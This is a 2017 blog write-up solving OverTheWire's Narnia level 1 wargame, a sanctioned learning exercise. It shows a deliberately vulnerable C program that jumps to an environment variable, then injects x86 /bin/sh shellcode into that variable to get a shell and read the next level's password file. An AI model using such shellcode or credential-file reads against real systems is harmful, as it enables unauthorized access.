---
layout:     post
title:      "Overthewire.org - Narnia 1 -> 2"
subtitle:   "Write-Up"
date:       2017-02-02 0:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
---

<h1>Introduction</h1>
<p>Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</p>

<h1>Challenge</h1>

<p>Firstly let's take a look at the code of the program. </p>

{% highlight c %}
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){    
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}

{% endhighlight %}

<p>The first thing that I see is that this program will check, whether or not the value of EGG variable is empty, if yes, it will print the message. But if not, it will try to execute it. </p>

<p>But what is enviromental variable? </p>

<p>Every time shell session is started, process is gathering information that should be available to the shell process and all child processes, putting them in special area called <b>enviroment</b>. </p>

<p><b>Enviromental variables</b> provide a way to influence the behaviour of software on the system. For example, the "LANG" environment variable determines the language in which software programs communicate with the user. They are represented as an key-value pairs. </p>

<pre>
KEY=VALUE
KEY=VALUE1:VALUE2
KEY="VALUE WITH SPACES"
</pre>

<p>Now when we understand the topic, let's try to set EGG variable as some random text possibly causing the program to crash. </p>

{% highlight bash %}
narnia1@melinda:/narnia$ export "EGG"="completelyrandomtext"
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault
{% endhighlight %}

<p>Yes! Now let's try and find some x86 shellcode that will be executed by the program. What I found working, was this <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shellcode</a>, which was actually second one I've tried - the first one didn't want to cooperate ;)</p>

{% highlight bash %}
narnia1@melinda:/narnia$ export "EGG"=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
{% endhighlight %}

<p>We have the password to the next level! </p>

<h1>Conclusion</h1>

<p>It was another great challenge from <a href="www.overthewire.org">OverTheWire</a>. I'm looking forward to the next one, maybe something a little bit harder? We'll see!</p>

<p><b>UPDATE</b></p>
<p>To gain better insight into who visits my website, I decided to add Piwik Analytics as a way to both give me essential information, and to repsect your privacy. You can read more at the <a href="/privacy/">Privacy Policy</a>, but if you still have any questions, contact me and I'll try my best to answer. </p>

<p>~ Stay safe!</p>
